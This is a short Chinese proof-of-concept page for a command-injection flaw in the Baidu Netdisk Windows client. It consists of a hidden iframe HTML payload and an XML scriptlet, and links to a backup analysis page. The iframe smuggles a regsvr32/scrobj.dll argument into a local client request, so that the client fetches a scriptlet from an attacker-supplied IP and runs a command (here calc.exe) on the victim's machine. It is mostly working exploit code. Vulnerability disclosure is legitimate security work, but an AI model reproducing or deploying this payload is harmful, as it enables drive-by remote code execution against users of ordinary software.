# poc.html

> 需要替换

```html
<html> <iframe width="1px" height="1px" referrerpolicy="no-referrer" src='https://localhost.pan.baidu.com:10000/?method=OpenSafeBox&uk=a%20-install%20regdll%20%22C:\\windows\\system32\\scrobj.dll\%22%20/u%20/i:http://【你的IP/端口】/poc.xml%20..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\Users\\【你的用户名】\\AppData\\Roaming\\baidu\\BaiduNetdisk%22'></iframe></html>
```

# poc.xml

```xml
<?xml version="1.0"?><scriptlet><registration progid="poc" classid="{10001111-0000-0000-0000-0000FEEDACDC}"> <script language="JScript">   <![CDATA[    var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c calc.exe");   ]]> </script></registration></scriptlet>
```

![](https://image.mrxn.net/a50eba85b24b45269741073febfae5cb.webp)

分析+复现 备份地址： [百度网盘（7.59.5.104） Windows客户端存在命令注入漏洞](https://mrxn.net/news/baidupan-windows-client-rce.html)
